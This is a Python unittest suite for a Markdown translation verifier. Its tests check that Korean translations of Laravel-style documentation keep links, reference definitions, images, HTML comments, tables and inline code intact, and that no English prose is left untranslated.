"""검증기의 동작과 경계 조건 검증."""

import unittest

from sync import response_contract, verify


class VerifyContentTests(unittest.TestCase):
    """내용 검증의 동작과 경계 조건 테스트 모음."""

    def test_accepts_preserved_reference_definition_as_structure(self):
        """보존된 reference definition을 구조로 허용."""

        source = '[cache]: /docs/13.x/cache "Cache docs"\n'

        self.assertEqual(
            response_contract.verify(source, source, locale="ko"),
            [],
        )
        self.assertEqual(verify.verify(source, source=source), [])

    def test_accepts_container_and_multiline_reference_definitions(self):
        """container와 여러 줄 reference definition을 허용."""

        source = """> [quote]: /quote

- [list]: /list

[multi]:
  /destination
  "multi
  line"
"""

        self.assertEqual(
            response_contract.verify(source, source, locale="ko"),
            [],
        )
        self.assertEqual(verify.verify(source, source=source), [])

    def test_final_verifier_rejects_invalid_reference_looking_english_prose(self):
        """reference definition처럼 보이는 잘못된 영어 산문을 최종 검증기에서 거부."""

        source = "[[Acquire lock]]: /safe\n"

        self.assertNotIn(
            "provider target language mismatch",
            response_contract.verify(source, source, locale="ko"),
        )
        self.assertIn(
            "untranslated source text",
            verify.verify(source, source=source),
        )

    def test_rejects_reordered_duplicate_reference_definitions(self):
        """중복 reference definition의 순서 변경을 거부."""

        source = (
            "See [Laravel][ref].\n\n"
            "[ref]: /cache\n\n"
            "[ref]: /routing\n"
        )
        translated = (
            "<!-- See [Laravel][ref]. -->\n"
            "[Laravel][ref] 문서를 참고합니다.\n\n"
            "[ref]: /routing\n\n"
            "[ref]: /cache\n"
        )

        self.assertIn(
            "provider link target mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "link target mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_nbsp_reference_label_drift(self):
        """NBSP가 포함된 reference label의 변경을 거부."""

        source = (
            "See [Laravel][cache docs].\n\n"
            "[cache docs]: /cache\n"
        )
        translated = (
            "<!-- See [Laravel][cache docs]. -->\n"
            "[Laravel][cache docs] 문서를 참고합니다.\n\n"
            "[cache\u00a0docs]: /cache\n"
        )

        self.assertIn(
            "provider link label mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "link label mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_changed_reference_style_visible_label(self):
        """reference style의 표시 label 변경을 거부."""

        source = "[Cache][x]\n\n[x]: cache\n"
        translated = (
            "<!-- [Cache][x] -->\n"
            "[캐시][x]\n\n"
            "[x]: cache\n"
        )

        self.assertIn(
            "provider link label mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "link label mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_reference_usage_resolved_to_another_definition(self):
        """reference 사용이 다른 definition으로 해석되면 거부."""

        source = (
            "See [Laravel][cache].\n\n"
            "[cache]: /cache\n"
            "[routing]: /routing\n"
        )
        translated = (
            "<!-- See [Laravel][cache]. -->\n"
            "[Laravel][routing] 문서를 참고합니다.\n\n"
            "[cache]: /cache\n"
            "[routing]: /routing\n"
        )

        self.assertIn(
            "provider link target mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "link target mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_equivalent_angle_reference_destination(self):
        """angle bracket으로 감싼 동등한 reference destination을 허용."""

        source = "[ref]: <https://example.com/cache>\n"
        translated = "[ref]: https://example.com/cache\n"

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )
        self.assertEqual(verify.verify(translated, source=source), [])

    def test_rejects_reference_target_route_class_drift(self):
        """reference target의 route class 변경을 거부."""

        source = "[ref]: /docs/13.x/cache\n"
        translated = "[ref]: /cache\n"

        self.assertIn(
            "provider link target mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "link target mismatch",
            verify.verify(translated, source=source, version="13.x"),
        )

    def test_rejects_reference_drift_after_raw_html_container_exit(self):
        """raw HTML container 종료 후의 reference 변경을 거부."""

        source = (
            "> <div>\n"
            "# Heading\n"
            '[ref]: /docs/13.x/cache "Cache docs"\n'
        )
        translated = (
            "> <div>\n"
            "<!-- # Heading -->\n"
            "# Heading\n"
            '[ref]: /docs/12.x/cache "Changed docs"\n'
        )

        self.assertIn(
            "provider link target mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "link target mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_link_only_legacy_pipe_table(self):
        """link만 있는 기존 pipe 표를 허용."""

        source = (
            "Name | Contract\n"
            "---- | --------\n"
            "[Cache](cache.md) | [Factory](factory.md)\n"
        )
        legacy_translation = (
            "<!-- Name | Contract ---- | -------- "
            "[Cache](cache.md) | [Factory](factory.md) -->\n"
            f"{source}"
        )
        fresh_translation = (
            "<!-- Name | Contract ---- | -------- "
            "[Cache](cache.md) | [Factory](factory.md) -->\n"
            "이름 | 계약\n"
            "---- | --------\n"
            "[Cache](cache.md) | [Factory](factory.md)\n"
        )

        self.assertEqual(
            response_contract.verify(fresh_translation, source, locale="ko"),
            [],
        )
        self.assertEqual(
            verify.verify(legacy_translation, source=source),
            [],
        )
        self.assertEqual(
            response_contract.verify(
                legacy_translation,
                source,
                locale="ko",
            ),
            [],
        )

    def test_accepts_preserved_version_and_date_legacy_table_cells(self):
        """버전과 날짜를 보존한 기존 표의 cell을 허용."""

        source = (
            "Name | Version | Date | Description\n"
            "---- | ------- | ---- | -----------\n"
            "Laravel | 13.x | 2026-01-01 | Stable release\n"
        )
        translated = (
            "<!-- Name | Version | Date | Description ---- | ------- | ---- "
            "| ----------- Laravel | 13.x | 2026-01-01 | Stable release -->\n"
            "이름 | 버전 | 날짜 | 설명\n"
            "---- | ------- | ---- | -----------\n"
            "Laravel | 13.x | 2026-01-01 | 안정 릴리스\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )
        self.assertEqual(verify.verify(translated, source=source), [])

    def test_rejects_optional_quote_annotation_moved_to_later_quote(self):
        """선택적 인용 annotation을 뒤쪽 인용문으로 이동하면 거부."""

        source = (
            "> First guidance.\n\n"
            "Middle paragraph.\n\n"
            "> Second guidance.\n"
        )
        translated = (
            "> 첫 번째 안내입니다.\n\n"
            "<!-- Middle paragraph. -->\n"
            "중간 문단입니다.\n\n"
            "> <!-- First guidance. -->\n"
            "> 두 번째 안내입니다.\n"
        )

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_changed_jsx_image_source_with_greater_than_expression(self):
        """greater-than 연산자가 포함된 JSX image source 변경을 거부."""

        source = (
            '<img src={count > 0 ? "/a.png" : "/b.png"} '
            'alt="Source" />\n'
        )
        translated = (
            '<!-- <img src={count > 0 ? "/a.png" : "/b.png"} '
            'alt="Source" /> -->\n'
            '<img src="/evil.png" alt="번역" />\n'
        )

        self.assertIn(
            "html image source mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_markdown_and_html_image_cross_format_reordering(self):
        """Markdown·HTML image의 형식 간 순서 변경을 거부."""

        source = (
            "![Cat](cat.png)\n\n"
            '<img src="dog.png" alt="Dog"/>\n'
        )
        translated = (
            '<!-- <img src="dog.png" alt="Dog"/> -->\n'
            '<img src="dog.png" alt="개"/>\n\n'
            "<!-- ![Cat](cat.png) -->\n"
            "![고양이](cat.png)\n"
        )

        self.assertIn(
            "link target mismatch",
            verify.verify(translated, source=source),
        )
        self.assertIn(
            "provider link target mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_detects_empty_html_comments_outside_code(self):
        """코드 밖의 빈 HTML 주석을 감지."""

        for text in ("<!-- -->\n", "<!--\n\t\n-->\n"):
            with self.subTest(text=text):
                self.assertIn("empty HTML comment", verify.verify(text))

    def test_accepts_a_preserved_empty_source_comment(self):
        """보존된 빈 원문 주석을 허용."""

        source = "<!-- -->\n\nKeep this paragraph.\n"
        translated = (
            "<!-- -->\n\n"
            "<!-- Keep this paragraph. -->\n"
            "이 문단을 유지합니다.\n"
        )

        self.assertNotIn(
            "empty HTML comment",
            verify.verify(translated, source=source),
        )

    def test_detects_an_extra_empty_html_comment(self):
        """추가된 빈 HTML 주석을 감지."""

        source = "Keep this paragraph.\n"
        translated = (
            "<!-- -->\n"
            "<!-- Keep this paragraph. -->\n"
            "이 문단을 유지합니다.\n"
        )

        self.assertIn(
            "empty HTML comment",
            verify.verify(translated, source=source),
        )

    def test_rejects_a_relocated_empty_source_comment(self):
        """위치가 바뀐 빈 원문 주석을 거부."""

        source = "<!-- -->\n\nKeep this paragraph.\n"
        translated = (
            "<!-- Keep this paragraph. -->\n"
            "이 문단을 유지합니다.\n\n"
            "<!-- -->\n"
        )

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_detects_unclosed_html_comment_outside_code(self):
        """코드 밖의 닫히지 않은 HTML 주석을 감지."""

        self.assertIn(
            "malformed HTML comment",
            verify.verify("본문입니다.\n\n<!-- unfinished\n"),
        )

    def test_detects_stray_html_comment_closer_outside_code(self):
        """코드 밖의 독립된 HTML 주석 종료자를 감지."""

        self.assertIn(
            "malformed HTML comment",
            verify.verify("본문입니다. -->\n"),
        )

    def test_detects_comment_delimiters_crossed_by_inline_code(self):
        """inline code를 가로지르는 주석 구분자를 감지."""

        text = "<!-- begin ` --> <!-- unclosed `\n"

        self.assertIn("malformed HTML comment", verify.verify(text))

    def test_ignores_malformed_comment_tokens_inside_fenced_code(self):
        """fenced code 안의 잘못된 주석 token을 무시."""

        text = """```html
<!-- -->
<!-- unfinished
-->
```
"""

        self.assertNotIn("malformed HTML comment", verify.verify(text))

    def test_ignores_comment_tokens_in_markdown_literal_contexts(self):
        """Markdown literal 문맥의 주석 token을 무시."""

        cases = (
            "~~~text <!--\nbody\n~~~\n",
            "    <!--\n",
            "---\ndescription: <!-- literal\n---\n",
        )

        for text in cases:
            with self.subTest(text=text):
                self.assertNotIn(
                    "malformed HTML comment",
                    verify.verify(text),
                )

    def test_accepts_a_preserved_multiline_source_comment(self):
        """보존된 여러 줄 원문 주석을 허용."""

        source = """<!--
keep line 1
keep line 2
-->

Acquire the cache lock.
"""
        translated = """<!--
keep line 1
keep line 2
-->

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_annotation_with_structural_html_wrapper_lines(self):
        """annotation이 포함된 구조 HTML wrapper 줄을 허용."""

        source = """<div>
<span>Visible text</span>
</div>
"""
        translated = """<!--
<div>
<span>Visible text</span>
</div>
-->
<div>
<span>표시 텍스트</span>
</div>
"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_comment_for_a_source_structural_html_block(self):
        """원문 구조 HTML block의 소유 주석을 허용."""

        source = """<p align="center">
<img src="release.png"/>
</p>
"""
        translated = f"""<!--
{source}-->
{source}"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_adjacent_legacy_image_comment_with_translated_alt(self):
        """기존 image 주석에 인접한 번역 alt를 허용."""

        source = '<img src="diagram.png" alt="Source diagram"/>\n'
        translated = (
            '<!-- <img src="diagram.png" alt="Source diagram"/> -->\n'
            '<img src="diagram.png" alt="번역된 다이어그램" />\n'
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_rejects_relocated_source_anchor_annotation(self):
        """위치가 바뀐 원문 anchor annotation을 거부."""

        source = '<a name="cache"></a>\n\nCache body.\n'
        translated = """<a name="cache"></a>

<!-- Cache body. -->
캐시 본문입니다.

<!-- <a name="cache"></a> -->
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_relocated_multiline_structural_annotation(self):
        """위치가 바뀐 여러 줄 구조 annotation을 거부."""

        source = """<p align="center">
<img src="release.png"/>
</p>
"""
        translated = f"""{source}
<!--
{source}-->
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_legacy_annotation_around_html_table_boundaries(self):
        """HTML 표 경계 주변의 기존 annotation을 거부."""

        source = """<table>
<tr><td><strong>Command</strong></td><td><code>php</code></td></tr>
<tr><td><strong>Args</strong></td><td><code>artisan boost:mcp</code></td></tr>
</table>
"""
        translated = """<!--
<table>
<tr><td><strong>Command</strong></td><td><code>php</code></td></tr>
<tr><td><strong>Args</strong></td><td><code>artisan boost:mcp</code></td></tr>
</table>
-->
<table>
<tr><td><strong>명령어</strong></td><td><code>php</code></td></tr>
<tr><td><strong>인수</strong></td><td><code>artisan boost:mcp</code></td></tr>
</table>
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_relocated_duplicate_structural_annotations(self):
        """위치가 바뀐 중복 구조 annotation을 거부."""

        source = "<div></div>\n\n<div></div>\n"
        translated = f"""{source}
<!-- <div></div> -->
<!-- <div></div> -->
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_an_owned_optional_quote_annotation(self):
        """owner가 있는 선택적 quote annotation을 허용."""

        source = "> Remember this guidance.\n"
        translated = """> <!-- > Remember this guidance. -->
> 이 안내를 기억하세요.
"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_owned_quote_annotations_after_a_fenced_block(self):
        """fenced block 뒤의 owner가 있는 quote annotation을 허용."""

        source = """```text
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

<a name="first"></a>

> [!NOTE]
> First guidance.

<a name="second"></a>

> [!NOTE]
> Second guidance.
"""
        translated = """```text
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

<a name="first"></a>

> [!NOTE]
> <!-- First guidance. -->
> 첫 번째 안내입니다.

<a name="second"></a>

> [!NOTE]
> <!-- Second guidance. -->
> 두 번째 안내입니다.
"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_rejects_optional_quote_annotation_at_the_wrong_depth(self):
        """잘못된 깊이에 있는 선택적 quote annotation을 거부."""

        source = "> Remember this guidance.\n"
        translated = """<!-- > Remember this guidance. -->
> > 이 안내를 기억하세요.
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_table_annotation_with_a_different_column_shape(self):
        """열 형태가 다른 표의 annotation을 거부."""

        source = "| Name | Value |\n"
        translated = """<!-- | Name | Value | -->
| 이름 |
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_table_annotation_moved_to_a_later_same_shape_table(self):
        """표 annotation을 뒤쪽의 같은 형태 표로 이동하면 거부."""

        source = """| First | Value |
| --- | --- |
| Alpha | One |

| Second | Value |
| --- | --- |
| Beta | Two |
"""
        translated = """| 첫째 | 값 |
| --- | --- |
| 알파 | 하나 |

<!-- | First | Value | -->
| 둘째 | 값 |
| --- | --- |
| 베타 | 둘 |
"""

        self.assertIn(
            "provider source comment mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_detects_title_case_action_phrase_with_translated_suffix(self):
        """번역 접미사가 붙은 Title Case 동작 문구를 감지."""

        source = "Delete All Records\n"
        translated = (
            "<!-- Delete All Records -->\n"
            "Delete All Records를 실행합니다.\n"
        )

        self.assertIn(
            "untranslated source text",
            verify.verify(translated, source=source),
        )

    def test_detects_prose_phrases_with_technical_prefixes(self):
        """기술 접두사가 붙은 산문 문구를 감지."""

        cases = (
            ("This Works", "This Works예요."),
            ("This Works.", "This Works예요."),
            ("API Requests Are Retried", "API Requests Are Retried를 사용합니다."),
            ("HTTP Requests Are Retried", "HTTP Requests Are Retried를 사용합니다."),
            ("Laravel Users Are Active", "Laravel Users Are Active를 사용합니다."),
            ("API Delete All Records", "API Delete All Records를 사용합니다."),
        )
        for source_body, translated_body in cases:
            with self.subTest(source=source_body):
                translated = (
                    f"<!-- {source_body} -->\n"
                    f"{translated_body}\n"
                )

                self.assertIn(
                    "untranslated source text",
                    verify.verify(translated, source=source_body + "\n"),
                )

    def test_detects_all_caps_prose_echoes(self):
        """대문자로만 된 산문 반복을 모두 감지."""

        cases = (
            "API ERROR HANDLING AND RETRY GUIDE",
            "HTTP JSON API SQL PHP",
            "API Delete All Records",
        )
        for source_body in cases:
            with self.subTest(source=source_body):
                translated = (
                    f"<!-- {source_body} -->\n"
                    f"{source_body}\n"
                )

                self.assertIn(
                    "untranslated source text",
                    verify.verify(translated, source=source_body + "\n"),
                )

    def test_detects_untranslated_prose_in_a_legacy_pipe_table(self):
        """기존 pipe 표의 미번역 산문을 감지."""

        source = (
            "Feature | Description\n"
            "------- | -------\n"
            "Lock | Prevent writes\n"
        )
        translated = (
            "<!-- Feature | Description ------- | ------- "
            "Lock | Prevent writes -->\n"
            f"{source}"
        )

        self.assertIn(
            "untranslated source text",
            verify.verify(translated, source=source),
        )

    def test_accepts_translated_prose_in_a_legacy_pipe_table(self):
        """기존 pipe 표의 번역 산문을 허용."""

        source = (
            "Feature | Description\n"
            "------- | -------\n"
            "Lock | Prevent writes\n"
        )
        translated = (
            "<!-- Feature | Description ------- | ------- "
            "Lock | Prevent writes -->\n"
            "기능 | 설명\n"
            "------- | -------\n"
            "잠금 | 쓰기 방지\n"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_detects_partial_prose_echo_in_a_legacy_pipe_table(self):
        """기존 pipe 표의 일부 산문 반복을 감지."""

        source = (
            "Feature | Description\n"
            "------- | -------\n"
            "Lock | Prevent writes\n"
        )
        translated = (
            "<!-- Feature | Description ------- | ------- "
            "Lock | Prevent writes -->\n"
            "기능 | 설명\n"
            "------- | -------\n"
            "Lock | Prevent writes를 차단합니다\n"
        )

        self.assertIn(
            "untranslated source text",
            verify.verify(translated, source=source),
        )

    def test_accepts_legacy_english_headers_with_translated_table_prose(self):
        """기존 영어 header가 있어도 번역된 표 산문을 허용."""

        source = (
            "Command | Description\n"
            "------- | -----------\n"
            "`valet start` | Start the Valet daemons.\n"
        )
        translated = (
            "<!-- Command | Description ------- | ----------- "
            "`valet start` | Start the Valet daemons. -->\n"
            "Command | Description\n"
            "------- | -----------\n"
            "`valet start` | Valet 데몬을 시작합니다.\n"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_preserved_product_and_api_names(self):
        """보존된 제품명과 API 이름을 허용."""

        cases = ("Laravel Vapor", "OpenAI Responses API")
        for source_body in cases:
            with self.subTest(source=source_body):
                translated = (
                    f"<!-- {source_body} -->\n"
                    f"{source_body}를 사용합니다.\n"
                )

                self.assertEqual(
                    verify.verify(translated, source=source_body + "\n"),
                    [],
                )

    def test_accepts_preserved_indented_command(self):
        """보존된 들여쓰기 명령을 허용."""

        source = "    vagrant destroy\n"
        translated = (
            "<!--     vagrant destroy -->\n"
            "    vagrant destroy\n"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_preserved_legacy_pipe_table(self):
        """보존된 기존 pipe 표를 허용."""

        source = (
            "Facade | Class\n"
            "------- | -------\n"
            "App | `Application`\n"
        )
        translated = (
            "<!-- Facade | Class ------- | ------- App | `Application` -->\n"
            f"{source}"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_preserved_inline_code_only_paragraph(self):
        """보존된 inline code만 있는 문단을 허용."""

        source = "`Illuminate\\Database\\Grammar`\n"
        translated = (
            "<!-- `Illuminate\\Database\\Grammar` -->\n"
            "`Illuminate\\Database\\Grammar`\n"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_mixed_bare_link_and_inline_code_identifier_list(self):
        """bare link와 inline code 식별자가 섞인 목록을 허용."""

        source = "[assertCookie](#assert-cookie)\n`assertSimilarJson`\n[assertStatus](#assert-status)\n"
        translated = (
            "<!-- [assertCookie](#assert-cookie) `assertSimilarJson` "
            "[assertStatus](#assert-status) -->\n"
            f"{source}"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_html_code_only_list_item_without_annotation(self):
        """HTML code만 있는 목록 항목에는 annotation이 없어도 허용."""

        sources = (
            "- <code>decimal:&lt;precision&gt;</code>\n",
            "- `decimal:`<code>&lt;digits&gt;</code>\n",
        )

        for source in sources:
            with self.subTest(source=source):
                self.assertEqual(
                    verify.missing_original_comments(source, source),
                    [],
                )
                self.assertEqual(verify.verify(source, source=source), [])

    def test_accepts_preserved_emphasized_identifier_group(self):
        """보존된 강조 식별자 그룹을 허용."""

        source = (
            "**whereDate / whereMonth / whereDay / whereYear / whereTime**\n"
        )
        translated = (
            "<!-- **whereDate / whereMonth / whereDay / whereYear / "
            "whereTime** -->\n"
            f"{source}"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_preserved_environment_assignment(self):
        """보존된 환경 변수 할당을 허용."""

        source = "PADDLE_SANDBOX=true\n"
        translated = (
            "<!-- PADDLE_SANDBOX=true -->\n"
            "PADDLE_SANDBOX=true\n"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_ignores_heading_attribute_syntax_inside_html_comments(self):
        """HTML 주석 안의 heading 속성 문법을 무시."""

        text = "<!--\n# Title {.class}\n-->\n"

        self.assertNotIn("title style class", verify.verify(text))

    def test_detects_link_url_changed_even_when_original_comment_contains_url(self):
        """원문 주석에 URL이 있어도 link URL 변경을 감지."""

        source = "See [Routing](routing.md#basic-routing)."
        translated = """<!-- See [Routing](routing.md#basic-routing). -->
[라우팅](routing.md#기본-라우팅)을 참고하세요.
"""

        self.assertIn("link target mismatch", verify.verify(translated, source=source))

    def test_detects_translated_link_text_even_when_url_is_preserved(self):
        """URL이 보존되어도 번역된 link text를 감지."""

        source = "See [Routing](routing.md#basic-routing)."
        translated = """<!-- See [Routing](routing.md#basic-routing). -->
[라우팅](routing.md#basic-routing)을 참고하세요.
"""

        self.assertIn("link label mismatch", verify.verify(translated, source=source))

    def test_accepts_preserved_link_text_when_url_is_preserved(self):
        """URL과 함께 보존된 link text를 허용."""

        source = "See [Routing](routing.md#basic-routing)."
        translated = """<!-- See [Routing](routing.md#basic-routing). -->
[Routing](routing.md#basic-routing)을 참고하세요.
"""

        self.assertNotIn("link label mismatch", verify.verify(translated, source=source))

    def test_accepts_translated_image_alt_with_ordered_target_and_title(self):
        """target과 title 순서를 지킨 번역 image alt를 허용."""

        source = (
            'Show the cat image: ![Cat](cat.png "Cat title").\n\n'
            'Show the dog image: ![Dog](dog.png "Dog title").\n'
        )
        translated = (
            '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
            '고양이 이미지를 표시합니다: ![고양이](cat.png "Cat title").\n\n'
            '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
            '개 이미지를 표시합니다: ![개](dog.png "Dog title").\n'
        )

        self.assertEqual([], verify.verify(translated, source=source))

    def test_detects_markdown_image_target_and_title_drift(self):
        """Markdown image의 target·title 변경을 감지."""

        source = (
            'Show the cat image: ![Cat](cat.png "Cat title").\n\n'
            'Show the dog image: ![Dog](dog.png "Dog title").\n'
        )
        cases = (
            (
                "swapped targets",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](dog.png "Cat title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](cat.png "Dog title").\n'
                ),
                "link target mismatch",
            ),
            (
                "missing image",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](cat.png "Cat title").\n'
                ),
                "link target mismatch",
            ),
            (
                "changed target",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](wrong.png "Cat title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](dog.png "Dog title").\n'
                ),
                "link target mismatch",
            ),
            (
                "swapped titles",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](cat.png "Dog title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](dog.png "Cat title").\n'
                ),
                "link title mismatch",
            ),
            (
                "changed title",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](cat.png "Wrong title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](dog.png "Dog title").\n'
                ),
                "link title mismatch",
            ),
        )

        for name, translated, expected_issue in cases:
            with self.subTest(name=name):
                self.assertIn(
                    expected_issue,
                    verify.verify(translated, source=source),
                )

    def test_ignores_backslash_escaped_link_syntax(self):
        """백슬래시로 escape한 link 문법을 무시."""

        source = "Literal \\[Docs](guide.md).\n"
        translated = """<!-- Literal \\[Docs](guide.md). -->
리터럴 \\[문서](other.md)입니다.
"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_detects_unclosed_link_with_parentheses_in_destination(self):
        """destination에 괄호가 있는 닫히지 않은 link를 감지."""

        target = "https://en.wikipedia.org/wiki/Mode_(statistics)"
        source = f"See [Mode]({target})."
        translated = f"""<!-- See [Mode]({target}). -->
[Mode](https://en.wikipedia.org/wiki/Mode_(statistics)을 참고하세요.
"""

        self.assertIn("link target mismatch", verify.verify(translated, source=source))

    def test_detects_changed_target_with_non_double_quoted_link_title(self):
        """큰따옴표가 아닌 link title이 있는 target 변경을 감지."""

        cases = (
            ("'Read more'", "'Read more'"),
            ("(Read more)", "(Read more)"),
        )
        for source_title, translated_title in cases:
            with self.subTest(title=source_title):
                source = f"See [Docs](guide.md {source_title}).\n"
                translated = (
                    f"<!-- See [Docs](guide.md {source_title}). -->\n"
                    f"[문서](other.md {translated_title})를 참고하세요.\n"
                )
                self.assertIn(
                    "link target mismatch",
                    verify.verify(translated, source=source),
                )

    def test_detects_changed_link_title_when_target_is_preserved(self):
        """target이 보존되어도 link title 변경을 감지."""

        source = 'See [Docs](guide.md "Read more").\n'
        translated = (
            '<!-- See [Docs](guide.md "Read more"). -->\n'
            '[Docs](guide.md "다음 읽기")를 참고하세요.\n'
        )

        self.assertIn(
            "link title mismatch",
            verify.verify(translated, source=source),
        )

    def test_detects_swapped_link_labels_and_targets(self):
        """서로 바뀐 link label과 target을 감지."""

        source = (
            "Generate a [redirect HTTP response](responses#redirects) "
            "for a [named route](routing#named-routes)."
        )
        translated = """<!-- Generate a [redirect HTTP response](responses#redirects) for a [named route](routing#named-routes). -->
[redirect HTTP response](routing#named-routes)에 대한 [named route](responses#redirects)을 생성합니다.
"""

        self.assertIn("link pair mismatch", verify.verify(translated, source=source))

    def test_accepts_normalized_reference_definition_label(self):
        """정규화된 reference definition label을 허용."""

        source = '[Cache \t DOC]: /docs/13.x/cache "Cache docs"\n'
        translated = '[cache doc]: /docs/13.x/cache "Cache docs"\n'

        issues = verify.verify(translated, source=source, version="13.x")

        self.assertEqual(issues, [])

    def test_detects_reference_definition_version_drift(self):
        """reference definition의 버전 변경을 감지."""

        source = '[cache-doc]: /docs/13.x/cache "Cache docs"\n'
        translated = '[CACHE-DOC]: /docs/12.x/cache "Cache docs"\n'

        issues = verify.verify(translated, source=source, version="13.x")

        self.assertIn("link target mismatch", issues)
        self.assertIn("link pair mismatch", issues)
        self.assertNotIn("link label mismatch", issues)

    def test_detects_reference_definition_title_drift(self):
        """reference definition의 title 변경을 감지."""

        source = '[cache-doc]: /docs/13.x/cache "Cache docs"\n'
        translated = '[cache-doc]: /docs/13.x/cache "다른 제목"\n'

        issues = verify.verify(translated, source=source, version="13.x")

        self.assertIn("link title mismatch", issues)
        self.assertNotIn("link target mismatch", issues)
        self.assertNotIn("link label mismatch", issues)
        self.assertNotIn("link pair mismatch", issues)

    def test_detects_missing_duplicate_reference_definition(self):
        """누락된 중복 reference definition을 감지."""

        definition = '[cache-doc]: /docs/13.x/cache "Cache docs"'
        source = f"{definition}\n\n{definition}\n"
        translated = f"{definition}\n"

        issues = verify.verify(translated, source=source, version="13.x")

        self.assertIn("link target mismatch", issues)
        self.assertIn("link label mismatch", issues)
        self.assertIn("link pair mismatch", issues)

    def test_detects_missing_inline_code_from_translated_body(self):
        """번역 본문에서 누락된 inline code를 감지."""

        source = "Set `user_id` before saving."
        translated = """<!-- Set `user_id` before saving. -->
저장하기 전에 사용자 ID를 설정합니다.
"""

        self.assertIn("inline code mismatch", verify.verify(translated, source=source))

    def test_ignores_backslash_escaped_backticks_as_inline_code(self):
        """백슬래시로 escape한 backtick을 inline code로 보지 않음."""

        source = "Use \\`literal\\` text.\n"
        translated = """<!-- Use \\`literal\\` text. -->
번역된 \\`리터럴\\` 텍스트입니다.
"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_detects_changed_multi_backtick_inline_code(self):
        """여러 backtick으로 감싼 inline code 변경을 감지."""

        source = "Use ``foo`bar`` now.\n"
        translated = "이제 ``foo`baz``를 사용합니다.\n"

        self.assertIn(
            "inline code mismatch",
            verify.verify(translated, source=source),
        )

    def test_detects_changed_multiline_inline_code(self):
        """여러 줄 inline code 변경을 감지."""

        source = "Use `foo\nbar` now.\n"
        translated = "이제 `foo\nbaz`를 사용합니다.\n"

        self.assertIn(
            "inline code mismatch",
            verify.verify(translated, source=source),
        )

    def test_does_not_pair_backticks_across_a_paragraph_boundary(self):
        """문단 경계를 넘어 backtick을 짝짓지 않음."""

        source = "Use the `using` method`:\n\nNext `sub` claim.\n"
        translated = """<!-- Use the `using` method`: -->
`using` 메서드를 사용합니다.

<!-- Next `sub` claim. -->
다음 `sub` 클레임입니다.
"""

